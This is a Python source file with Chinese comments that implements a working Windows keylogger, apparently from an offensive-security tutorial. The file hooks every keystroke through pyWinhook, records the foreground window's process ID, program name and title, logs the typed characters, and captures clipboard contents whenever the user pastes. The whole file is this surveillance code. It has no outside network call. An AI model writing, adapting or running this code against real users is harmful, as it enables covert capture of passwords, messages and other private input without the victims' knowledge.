# -*- coding: utf-8 -*-
from ctypes import byref, create_string_buffer, c_ulong, windll     # 与C语言混合编程
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard


TIMEOUT = 10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        """ 抓取活跃窗口和进程id """
        # GetForegroundWindow 返回桌面上活跃窗口的句柄
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # GetWindowThreadProcessId 根据句柄获取窗口对应的进程ID
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        # 进程id
        process_id = f"{pid.value}"

        # 进程名称
        executable = create_string_buffer(512)
        # 打开对应的进程
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        # 抓取进程实际的程序名
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        # 抓取窗口标题栏的完整文本
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            self.current_window = "窗口名称未知."

        print("\n", process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def keystroke(self, event):
        """ 回调函数 """
        # 检查用户是否切换了窗口
        if event.WindowName != self.current_window:
            self.get_current_process()
        # 检查是否为ASCII可打印字符
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")
        # 检查是否在进行粘贴操作
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
        return True

def run():
    """ 运行 """
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.keystroke
    hm.HookKeyboard()   # Hook 所有按键事件
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    log = run()
    print(log)
    print("done.")